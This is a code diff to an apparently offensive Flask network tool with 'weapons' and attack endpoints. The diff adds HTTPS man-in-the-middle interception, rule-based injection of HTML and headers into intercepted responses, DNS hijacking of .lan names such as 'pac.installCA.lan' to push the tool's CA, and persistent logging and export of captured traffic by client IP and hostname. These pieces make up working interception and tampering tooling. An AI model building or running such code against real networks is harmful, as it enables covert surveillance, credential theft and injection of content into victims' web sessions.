@@ -27,8 +27,12 @@ import urllib.request
 import urllib.parse
 import base64
 import secrets
+import uuid
+import sqlite3
+import csv
 from functools import wraps
-from flask import Flask, request, jsonify, render_template_string, abort, Response
+from datetime import datetime
+from flask import Flask, request, jsonify, render_template_string, abort, Response, send_file
 
 # ---------- configuration ----------
 SECRET = os.environ.get('GODHAND_SECRET', '')
@@ -114,7 +118,9 @@ STATE = {
     },
     'ngrok_proc': None,
     'log': [],
-    'status': 'Ready'
+    'status': 'Ready',
+    'lan_domains': ['pac.installCA.lan'],  # Domains resolved to local IP for .lan hijacking
+    'injection_rules': [],  # Response injection rules [{id, enabled, hostname_pattern, action_type, action_value, ...}]
 }
 STATE_LOCK = threading.Lock()
 
@@ -415,6 +421,314 @@ except Exception as e:
     CERT_AUTHORITY = None
     CERT_CACHE = None
 
+# ---------- HTTP Response Injection/Modification ----------
+class ResponseModifier:
+    """Apply injection rules to HTTP responses."""
+
+    @staticmethod
+    def parse_http_response(data: bytes):
+        """Parse HTTP response into headers and body.
+
+        Returns: (status_line, headers_dict, body) or (None, {}, None) on error
+        """
+        try:
+            parts = data.split(b'\r\n\r\n', 1)
+            if not parts:
+                return None, {}, None
+
+            header_section = parts[0]
+            body = parts[1] if len(parts) > 1 else b''
+
+            lines = header_section.split(b'\r\n')
+            if not lines:
+                return None, {}, None
+
+            status_line = lines[0].decode('ascii', errors='ignore')
+            headers = {}
+
+            for line in lines[1:]:
+                if b':' in line:
+                    key, value = line.split(b':', 1)
+                    headers[key.decode('ascii', errors='ignore').strip()] = value.decode('ascii', errors='ignore').strip()
+
+            return status_line, headers, body
+        except Exception as e:
+            add_log('warn', f'Failed to parse HTTP response: {e}')
+            return None, {}, None
+
+    @staticmethod
+    def rebuild_http_response(status_line: str, headers: dict, body: bytes) -> bytes:
+        """Rebuild HTTP response from parsed components."""
+        response = f"{status_line}\r\n".encode('ascii')
+        for key, value in headers.items():
+            response += f"{key}: {value}\r\n".encode('ascii')
+        response += b"\r\n"
+        response += body
+        return response
+
+    @staticmethod
+    def apply_rules(hostname: str, response_data: bytes) -> bytes:
+        """Apply enabled injection rules to HTTP response.
+
+        Args:
+            hostname: Target hostname
+            response_data: Raw HTTP response bytes
+
+        Returns:
+            Modified response bytes (or original if no rules matched)
+        """
+        try:
+            with STATE_LOCK:
+                rules = [r for r in STATE.get('injection_rules', []) if r.get('enabled', False)]
+
+            if not rules:
+                return response_data
+
+            status_line, headers, body = ResponseModifier.parse_http_response(response_data)
+            if status_line is None:
+                return response_data
+
+            modified = False
+
+            for rule in rules:
+                pattern = rule.get('hostname_pattern', '')
+                if not pattern or not ResponseModifier._pattern_matches(pattern, hostname):
+                    continue
+
+                action_type = rule.get('action_type', '')
+                action_value = rule.get('action_value', '')
+
+                try:
+                    if action_type == 'add_header':
+                        # Format: "Header-Name: Header-Value"
+                        if ':' in action_value:
+                            key, value = action_value.split(':', 1)
+                            headers[key.strip()] = value.strip()
+                            modified = True
+
+                    elif action_type == 'remove_header':
+                        # action_value = header name to remove
+                        if action_value in headers:
+                            del headers[action_value]
+                            modified = True
+
+                    elif action_type == 'replace_body':
+                        # action_value = "search_string|replacement_string"
+                        if '|' in action_value:
+                            search, replacement = action_value.split('|', 1)
+                            if search.encode() in body:
+                                body = body.replace(search.encode(), replacement.encode())
+                                modified = True
+
+                    elif action_type == 'inject_html':
+                        # action_value = HTML to inject before </body>
+                        if b'</body>' in body or b'</BODY>' in body:
+                            injection = action_value.encode()
+                            body = body.replace(b'</body>', injection + b'</body>')
+                            if body == response_data:  # Try uppercase
+                                body = body.replace(b'</BODY>', injection + b'</BODY>')
+                            modified = True
+
+                except Exception as e:
+                    add_log('warn', f'Failed to apply injection rule {rule.get("id")}: {e}')
+
+            if modified:
+                # Update Content-Length if body changed
+                if b'Content-Length' in str(headers).encode():
+                    headers['Content-Length'] = str(len(body))
+
+                return ResponseModifier.rebuild_http_response(status_line, headers, body)
+
+            return response_data
+
+        except Exception as e:
+            add_log('warn', f'Error applying injection rules: {e}')
+            return response_data
+
+    @staticmethod
+    def _pattern_matches(pattern: str, hostname: str) -> bool:
+        """Check if hostname matches pattern (supports wildcards).
+
+        Examples:
+            '*.example.com' matches 'api.example.com'
+            'example.com' matches 'example.com'
+            '*' matches any hostname
+        """
+        if pattern == '*':
+            return True
+        if pattern == hostname:
+            return True
+
+        # Convert wildcard pattern to regex
+        import fnmatch
+        return fnmatch.fnmatch(hostname, pattern)
+
+# ---------- Traffic Persistence Database ----------
+class TrafficDatabase:
+    """SQLite database for persistent HTTPS traffic storage."""
+
+    def __init__(self, db_path=None):
+        if db_path is None:
+            db_path = os.path.join(GATEWAY_DIR, 'https_traffic.db')
+        self.db_path = db_path
+        self.lock = threading.Lock()
+        self._init_db()
+
+    def _init_db(self):
+        """Initialize database schema if not exists."""
+        try:
+            with self.lock:
+                conn = sqlite3.connect(self.db_path)
+                cursor = conn.cursor()
+                cursor.execute('''
+                    CREATE TABLE IF NOT EXISTS https_traffic (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        timestamp REAL,
+                        type TEXT,
+                        client_ip TEXT,
+                        hostname TEXT,
+                        request_line TEXT,
+                        status_line TEXT,
+                        bytes INTEGER,
+                        method TEXT,
+                        path TEXT,
+                        status_code INTEGER,
+                        request_body_size INTEGER,
+                        response_body_size INTEGER,
+                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                    )
+                ''')
+                cursor.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON https_traffic(timestamp)')
+                cursor.execute('CREATE INDEX IF NOT EXISTS idx_hostname ON https_traffic(hostname)')
+                cursor.execute('CREATE INDEX IF NOT EXISTS idx_client_ip ON https_traffic(client_ip)')
+                conn.commit()
+                conn.close()
+                add_log('info', f'Traffic database initialized: {self.db_path}')
+        except Exception as e:
+            add_log('error', f'Failed to initialize traffic database: {e}')
+
+    def add_entry(self, entry: dict):
+        """Add traffic entry to database."""
+        try:
+            with self.lock:
+                conn = sqlite3.connect(self.db_path)
+                cursor = conn.cursor()
+                cursor.execute('''
+                    INSERT INTO https_traffic
+                    (timestamp, type, client_ip, hostname, request_line, status_line, bytes,
+                     method, path, status_code, request_body_size, response_body_size)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                ''', (
+                    entry.get('timestamp'),
+                    entry.get('type'),
+                    entry.get('client_ip'),
+                    entry.get('hostname'),
+                    entry.get('request_line', ''),
+                    entry.get('status_line', ''),
+                    entry.get('bytes', 0),
+                    entry.get('method', ''),
+                    entry.get('path', ''),
+                    entry.get('status_code'),
+                    entry.get('request_body_size', 0),
+                    entry.get('response_body_size', 0)
+                ))
+                conn.commit()
+                conn.close()
+
+                # Cleanup old entries (keep last 10000)
+                self._cleanup_old_entries()
+        except Exception as e:
+            add_log('warn', f'Failed to add traffic entry to database: {e}')
+
+    def _cleanup_old_entries(self):
+        """Remove entries older than a threshold, keeping last 10000."""
+        try:
+            with self.lock:
+                conn = sqlite3.connect(self.db_path)
+                cursor = conn.cursor()
+                cursor.execute('SELECT COUNT(*) FROM https_traffic')
+                count = cursor.fetchone()[0]
+
+                if count > 10000:
+                    # Delete oldest entries, keeping newest 10000
+                    cursor.execute('''
+                        DELETE FROM https_traffic WHERE id NOT IN (
+                            SELECT id FROM https_traffic ORDER BY timestamp DESC LIMIT 10000
+                        )
+                    ''')
+                    conn.commit()
+                conn.close()
+        except Exception as e:
+            add_log('warn', f'Failed to cleanup old traffic entries: {e}')
+
+    def query(self, limit=100, offset=0, hostname_filter=None, client_ip_filter=None):
+        """Query traffic entries from database."""
+        try:
+            with self.lock:
+                conn = sqlite3.connect(self.db_path)
+                conn.row_factory = sqlite3.Row
+                cursor = conn.cursor()
+
+                query = 'SELECT * FROM https_traffic WHERE 1=1'
+                params = []
+
+                if hostname_filter:
+                    query += ' AND hostname LIKE ?'
+                    params.append(f'%{hostname_filter}%')
+
+                if client_ip_filter:
+                    query += ' AND client_ip = ?'
+                    params.append(client_ip_filter)
+
+                query += ' ORDER BY timestamp DESC LIMIT ? OFFSET ?'
+                params.extend([limit, offset])
+
+                cursor.execute(query, params)
+                rows = cursor.fetchall()
+                conn.close()
+
+                return [dict(row) for row in rows]
+        except Exception as e:
+            add_log('warn', f'Failed to query traffic database: {e}')
+            return []
+
+    def export_csv(self, output_path=None, hostname_filter=None, client_ip_filter=None):
+        """Export traffic to CSV file."""
+        try:
+            rows = self.query(limit=100000, hostname_filter=hostname_filter, client_ip_filter=client_ip_filter)
+
+            if output_path is None:
+                output_path = os.path.join(GATEWAY_DIR, f'https_traffic_{int(time.time())}.csv')
+
+            with open(output_path, 'w', newline='') as f:
+                if rows:
+                    writer = csv.DictWriter(f, fieldnames=rows[0].keys())
+                    writer.writeheader()
+                    writer.writerows(rows)
+
+            add_log('info', f'Traffic exported to CSV: {output_path}')
+            return output_path
+        except Exception as e:
+            add_log('error', f'Failed to export traffic to CSV: {e}')
+            return None
+
+    def export_json(self, output_path=None, hostname_filter=None, client_ip_filter=None):
+        """Export traffic to JSON file."""
+        try:
+            rows = self.query(limit=100000, hostname_filter=hostname_filter, client_ip_filter=client_ip_filter)
+
+            if output_path is None:
+                output_path = os.path.join(GATEWAY_DIR, f'https_traffic_{int(time.time())}.json')
+
+            with open(output_path, 'w') as f:
+                json.dump(rows, f, indent=2, default=str)
+
+            add_log('info', f'Traffic exported to JSON: {output_path}')
+            return output_path
+        except Exception as e:
+            add_log('error', f'Failed to export traffic to JSON: {e}')
+            return None
+
 # ---------- HTTPS MITM Proxy Core ----------
 class HTTPSInterceptProxy:
     """Pure Python HTTPS interception proxy (transparent MITM).
@@ -431,13 +745,14 @@ class HTTPSInterceptProxy:
     Phase 2 (injection): Modify responses before forwarding.
     """
 
-    def __init__(self, listen_port=8888, ca=None, cert_cache=None):
+    def __init__(self, listen_port=8888, ca=None, cert_cache=None, max_log_size=10000):
         self.listen_port = listen_port
         self.ca = ca
         self.cert_cache = cert_cache
         self.running = False
         self.proxy_thread = None
         self.traffic_log = []
+        self.max_log_size = max_log_size
 
     @staticmethod
     def extract_sni(data: bytes) -> str:
@@ -569,7 +884,7 @@ class HTTPSInterceptProxy:
             try:
                 client_tls = context.wrap_socket(client_socket, server_side=True)
             except ssl.SSLError as e:
-                add_log('warn', f'TLS wrap failed for {hostname}: {e}')
+                add_log('error', f'TLS handshake failed for {client_addr[0]} → {hostname}: {type(e).__name__}: {e}')
                 return
 
             # Connect to upstream server
@@ -589,7 +904,7 @@ class HTTPSInterceptProxy:
             try:
                 upstream_tls = upstream_context.wrap_socket(upstream_socket, server_hostname=hostname)
             except ssl.SSLError as e:
-                add_log('warn', f'Upstream TLS failed for {hostname}: {e}')
+                add_log('error', f'Upstream TLS failed for {hostname}:443: {type(e).__name__}: {e}')
                 return
 
             # Forward traffic between client and upstream
@@ -642,6 +957,8 @@ class HTTPSInterceptProxy:
                     # Upstream → Client
                     data = upstream_tls.recv(buffer_size)
                     if data:
+                        # Phase 2: Apply injection rules to responses
+                        data = ResponseModifier.apply_rules(hostname, data)
                         client_tls.sendall(data)
                         # Phase 1: Log HTTP responses (first line contains status code)
                         if data.startswith(b'HTTP/'):
@@ -668,7 +985,7 @@ class HTTPSInterceptProxy:
                     'request_line': request_line,
                     'bytes': len(data)
                 }
-                self.traffic_log.append(entry)
+                self._add_traffic_entry(entry)
                 add_log('info', f'[HTTPS] {client_ip} → {hostname}: {request_line}')
         except Exception as e:
             add_log('warn', f'Failed to log HTTP request: {e}')
@@ -690,7 +1007,7 @@ class HTTPSInterceptProxy:
                     'status_line': status_line,
                     'bytes': len(data)
                 }
-                self.traffic_log.append(entry)
+                self._add_traffic_entry(entry)
                 add_log('info', f'[HTTPS] {hostname} → {client_ip}: {status_line}')
         except Exception as e:
             add_log('warn', f'Failed to log HTTP response: {e}')
@@ -737,6 +1054,19 @@ class HTTPSInterceptProxy:
         """Stop MITM proxy server."""
         self.running = False
         add_log('info', 'MITM proxy stopped')
+
+    def _add_traffic_entry(self, entry: dict):
+        """Add entry to traffic log with automatic size management and database persistence."""
+        self.traffic_log.append(entry)
+        if len(self.traffic_log) > self.max_log_size:
+            self.traffic_log = self.traffic_log[-self.max_log_size:]
+
+        # Store in database for persistence (Phase 5D)
+        try:
+            if TRAFFIC_DATABASE:
+                TRAFFIC_DATABASE.add_entry(entry)
+        except Exception as e:
+            pass  # Silently fail; don't disrupt traffic forwarding
 
     def get_traffic_log(self, limit=100):
         """Return recent traffic log entries."""
@@ -790,6 +1120,14 @@ function FindProxyForURL(url, host) {{
 
 
 app = Flask(__name__)
+
+# Initialize traffic database
+try:
+    TRAFFIC_DATABASE = TrafficDatabase()
+    add_log('success', 'Traffic database initialized')
+except Exception as e:
+    add_log('error', f'Failed to initialize traffic database: {e}')
+    TRAFFIC_DATABASE = None
 
 @app.after_request
 def add_no_cache_headers(response):
@@ -1104,7 +1442,8 @@ class SocketProxy:
             sock.bind((iface, 0))
             sock.close()
             return True
-        except (OSError, PermissionError):
+        except (OSError, PermissionError) as e:
+            add_log('dev', f'AF_PACKET test failed on {iface}: {e}')
             return False
 
     @staticmethod
@@ -1115,7 +1454,8 @@ class SocketProxy:
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
             sock.close()
             return True
-        except (OSError, PermissionError):
+        except (OSError, PermissionError) as e:
+            add_log('dev', f'AF_INET test failed on {iface}: {e}')
             return False
 
     @staticmethod
@@ -1127,7 +1467,8 @@ class SocketProxy:
             test_sock.connect(('127.0.0.1', 1080))
             test_sock.close()
             return True
-        except (OSError, TimeoutError):
+        except (OSError, TimeoutError) as e:
+            add_log('dev', f'SOCKS proxy test failed (localhost:1080): {e}')
             return False
 
     @staticmethod
@@ -1452,8 +1793,11 @@ def fetch_blocklist_domains():
         add_log('warn', f'Blocklist fetch failed, using built-in list: {e}')
         return list(DEFAULT_BLOCKED_DOMAINS)
 
-def write_gateway_configs(domains):
+def write_gateway_configs(domains, lan_domains=None):
     os.makedirs(GATEWAY_DIR, exist_ok=True)
+    if lan_domains is None:
+        lan_domains = ['pac.installCA.lan']
+
     with open(GW_BLOCKLIST_CONF, 'w') as f:
         for d in domains:
             f.write(f'local-zone: "{d}." always_nxdomain\n')
@@ -1479,6 +1823,18 @@ def write_gateway_configs(domains):
     with open(GW_DNSCRYPT_CONF, 'w') as f:
         f.write(dnscrypt_toml)
 
+    # Get local device IP for .lan domain resolution
+    local_ip = get_local_ip()
+
+    # Build local-zone entries for .lan domains
+    lan_zones = []
+    for lan_domain in lan_domains:
+        lan_zones.append(f'            local-zone: "{lan_domain}." static')
+        lan_zones.append(f'            local-data: "{lan_domain}. 300 IN A {local_ip}"')
+        lan_zones.append(f'            local-data-ptr: "{local_ip} 300 IN PTR {lan_domain}."')
+
+    lan_zones_str = '\n'.join(lan_zones) if lan_zones else ''
+
     unbound_conf = textwrap.dedent(f"""\
         server:
             interface: 0.0.0.0@{GW_DNS_PORT}
@@ -1499,6 +1855,7 @@ def write_gateway_configs(domains):
             pidfile: "{GATEWAY_DIR}/unbound.pid"
             logfile: "{GATEWAY_DIR}/unbound.log"
             include: "{GW_BLOCKLIST_CONF}"
+        {lan_zones_str}
         forward-zone:
             name: "."
             forward-addr: 127.0.0.1@{GW_DNSCRYPT_PORT}
@@ -1524,7 +1881,9 @@ def start_gateway_dns():
     if not ensure_tool('unbound'):
         raise RuntimeError('unbound could not be installed')
     if not os.path.exists(GW_BLOCKLIST_CONF):
-        write_gateway_configs(list(DEFAULT_BLOCKED_DOMAINS))
+        with STATE_LOCK:
+            lan_domains = STATE.get('lan_domains', ['pac.installCA.lan'])
+        write_gateway_configs(list(DEFAULT_BLOCKED_DOMAINS), lan_domains=lan_domains)
     stop_proc('dnscrypt-proxy')
     stop_proc('unbound')
     time.sleep(0.3)
@@ -6097,6 +6456,7 @@ def api_stop_network_port_monitor():
 @app.route('/api/stop_attack', methods=['POST'])
 @require_auth
 def api_stop_attack():
+    interface_to_reset = None
     with STATE_LOCK:
         for weapon, pids in list(STATE['attack_pids'].items()):
             kill_attack(pids)
@@ -6108,13 +6468,16 @@ def api_stop_attack():
             except:
                 pass
             STATE['monitor_log_path'] = None
-    # Only reset monitor mode if a weapon actually put the interface into it
-    # (weapon 2's monitor path). Weapons 3/4/5 and the ARP/native fallbacks never
-    # switch modes, so firing `iw set type managed` on every stop would needlessly
-    # bounce the Wi-Fi association -- exactly the connectivity disruption to avoid.
-    if STATE['interface'] and get_state('monitor_mode_active'):
-        set_monitor(STATE['interface'], False)
-        update_state('monitor_mode_active', False)
+        # Only reset monitor mode if a weapon actually put the interface into it
+        # (weapon 2's monitor path). Weapons 3/4/5 and the ARP/native fallbacks never
+        # switch modes, so firing `iw set type managed` on every stop would needlessly
+        # bounce the Wi-Fi association -- exactly the connectivity disruption to avoid.
+        if STATE['interface'] and get_state('monitor_mode_active'):
+            interface_to_reset = STATE['interface']
+    if interface_to_reset:
+        set_monitor(interface_to_reset, False)
+        with STATE_LOCK:
+            update_state('monitor_mode_active', False)
     add_log('info', 'All attacks stopped')
     return jsonify({'success': True, 'status': 'All attacks stopped'})
 
@@ -6226,6 +6589,146 @@ def api_gateway_update_blocklist():
 @require_auth
 def api_gateway_dns_test():
     return jsonify({'success': True, 'results': test_gateway_dns()})
+
+@app.route('/api/gateway/dns/lan_domains', methods=['GET'])
+@require_auth
+def api_gateway_list_lan_domains():
+    with STATE_LOCK:
+        lan_domains = list(STATE.get('lan_domains', ['pac.installCA.lan']))
+    return jsonify({'success': True, 'lan_domains': lan_domains})
+
+@app.route('/api/gateway/dns/add_lan_domain', methods=['POST'])
+@require_auth
+def api_gateway_add_lan_domain():
+    data = request.json
+    domain = data.get('domain', '').strip()
+    if not domain:
+        return jsonify({'success': False, 'error': 'Domain required'})
+    if not domain.endswith('.lan'):
+        return jsonify({'success': False, 'error': 'Domain must end with .lan'})
+
+    with STATE_LOCK:
+        if domain not in STATE['lan_domains']:
+            STATE['lan_domains'].append(domain)
+        lan_domains = list(STATE['lan_domains'])
+
+    # Regenerate gateway configs with new domains
+    try:
+        write_gateway_configs(list(DEFAULT_BLOCKED_DOMAINS), lan_domains=lan_domains)
+        add_log('info', f'Added .lan domain: {domain}')
+        return jsonify({'success': True, 'lan_domains': lan_domains})
+    except Exception as e:
+        add_log('error', f'Failed to add .lan domain: {e}')
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/gateway/dns/remove_lan_domain', methods=['POST'])
+@require_auth
+def api_gateway_remove_lan_domain():
+    data = request.json
+    domain = data.get('domain', '').strip()
+    if not domain:
+        return jsonify({'success': False, 'error': 'Domain required'})
+
+    with STATE_LOCK:
+        if domain in STATE['lan_domains']:
+            STATE['lan_domains'].remove(domain)
+        lan_domains = list(STATE['lan_domains'])
+
+    # Regenerate gateway configs without the removed domain
+    try:
+        write_gateway_configs(list(DEFAULT_BLOCKED_DOMAINS), lan_domains=lan_domains)
+        add_log('info', f'Removed .lan domain: {domain}')
+        return jsonify({'success': True, 'lan_domains': lan_domains})
+    except Exception as e:
+        add_log('error', f'Failed to remove .lan domain: {e}')
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/https_injection/rules', methods=['GET'])
+@require_auth
+def api_injection_list_rules():
+    with STATE_LOCK:
+        rules = [dict(r) for r in STATE.get('injection_rules', [])]
+    return jsonify({'success': True, 'rules': rules})
+
+@app.route('/api/https_injection/rules', methods=['POST'])
+@require_auth
+def api_injection_create_rule():
+    data = request.json
+    rule_id = str(uuid.uuid4())[:8]
+    rule = {
+        'id': rule_id,
+        'enabled': data.get('enabled', True),
+        'hostname_pattern': data.get('hostname_pattern', ''),
+        'action_type': data.get('action_type', ''),  # 'add_header', 'remove_header', 'replace_body', 'inject_html'
+        'action_value': data.get('action_value', ''),
+        'description': data.get('description', ''),
+        'created_at': time.time()
+    }
+
+    if not rule['hostname_pattern']:
+        return jsonify({'success': False, 'error': 'hostname_pattern required'})
+    if not rule['action_type'] or rule['action_type'] not in ['add_header', 'remove_header', 'replace_body', 'inject_html']:
+        return jsonify({'success': False, 'error': 'action_type must be: add_header, remove_header, replace_body, or inject_html'})
+
+    with STATE_LOCK:
+        STATE['injection_rules'].append(rule)
+
+    add_log('info', f'Created injection rule: {rule_id} ({rule["action_type"]})')
+    return jsonify({'success': True, 'rule': rule})
+
+@app.route('/api/https_injection/rules/<rule_id>', methods=['GET'])
+@require_auth
+def api_injection_get_rule(rule_id):
+    with STATE_LOCK:
+        rule = next((r for r in STATE.get('injection_rules', []) if r['id'] == rule_id), None)
+
+    if not rule:
+        return jsonify({'success': False, 'error': 'Rule not found'})
+
+    return jsonify({'success': True, 'rule': rule})
+
+@app.route('/api/https_injection/rules/<rule_id>', methods=['PUT'])
+@require_auth
+def api_injection_update_rule(rule_id):
+    data = request.json
+
+    with STATE_LOCK:
+        rule = next((r for r in STATE.get('injection_rules', []) if r['id'] == rule_id), None)
+        if not rule:
+            return jsonify({'success': False, 'error': 'Rule not found'})
+
+        # Update allowed fields
+        if 'enabled' in data:
+            rule['enabled'] = data['enabled']
+        if 'hostname_pattern' in data:
+            rule['hostname_pattern'] = data['hostname_pattern']
+        if 'action_type' in data:
+            if data['action_type'] not in ['add_header', 'remove_header', 'replace_body', 'inject_html']:
+                return jsonify({'success': False, 'error': 'Invalid action_type'})
+            rule['action_type'] = data['action_type']
+        if 'action_value' in data:
+            rule['action_value'] = data['action_value']
+        if 'description' in data:
+            rule['description'] = data['description']
+
+        rule['updated_at'] = time.time()
+
+    add_log('info', f'Updated injection rule: {rule_id}')
+    return jsonify({'success': True, 'rule': rule})
+
+@app.route('/api/https_injection/rules/<rule_id>', methods=['DELETE'])
+@require_auth
+def api_injection_delete_rule(rule_id):
+    with STATE_LOCK:
+        original_count = len(STATE.get('injection_rules', []))
+        STATE['injection_rules'] = [r for r in STATE['injection_rules'] if r['id'] != rule_id]
+        deleted = original_count > len(STATE['injection_rules'])
+
+    if not deleted:
+        return jsonify({'success': False, 'error': 'Rule not found'})
+
+    add_log('info', f'Deleted injection rule: {rule_id}')
+    return jsonify({'success': True, 'status': 'Rule deleted'})
 
 @app.route('/api/gateway/proxy/start', methods=['POST'])
 @require_auth
@@ -6973,6 +7476,50 @@ def api_https_traffic():
         'entries': filtered[:limit],
         'proxy_running': HTTPS_PROXY.running
     })
+
+@app.route('/api/https_traffic/export', methods=['GET'])
+@require_auth
+def api_https_traffic_export():
+    """Export HTTPS traffic to CSV or JSON format (Phase 5D).
+
+    Query parameters:
+    - format: 'csv' or 'json' (default: 'json')
+    - hostname_filter: Filter by hostname
+    - client_ip_filter: Filter by client IP
+
+    Returns:
+        File download or JSON error response
+    """
+    if not TRAFFIC_DATABASE:
+        return jsonify({'success': False, 'error': 'Traffic database not initialized'}), 500
+
+    export_format = request.args.get('format', 'json').lower()
+    hostname_filter = request.args.get('hostname_filter', '')
+    client_ip_filter = request.args.get('client_ip_filter', '')
+
+    if export_format not in ['csv', 'json']:
+        return jsonify({'success': False, 'error': 'Format must be csv or json'}), 400
+
+    try:
+        if export_format == 'csv':
+            filepath = TRAFFIC_DATABASE.export_csv(
+                hostname_filter=hostname_filter if hostname_filter else None,
+                client_ip_filter=client_ip_filter if client_ip_filter else None
+            )
+            if filepath and os.path.exists(filepath):
+                return send_file(filepath, as_attachment=True, download_name=os.path.basename(filepath))
+        else:
+            filepath = TRAFFIC_DATABASE.export_json(
+                hostname_filter=hostname_filter if hostname_filter else None,
+                client_ip_filter=client_ip_filter if client_ip_filter else None
+            )
+            if filepath and os.path.exists(filepath):
+                return send_file(filepath, as_attachment=True, download_name=os.path.basename(filepath))
+
+        return jsonify({'success': False, 'error': 'Export failed'}), 500
+    except Exception as e:
+        add_log('error', f'Traffic export failed: {e}')
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/https_traffic/stream', methods=['GET'])
 @require_auth
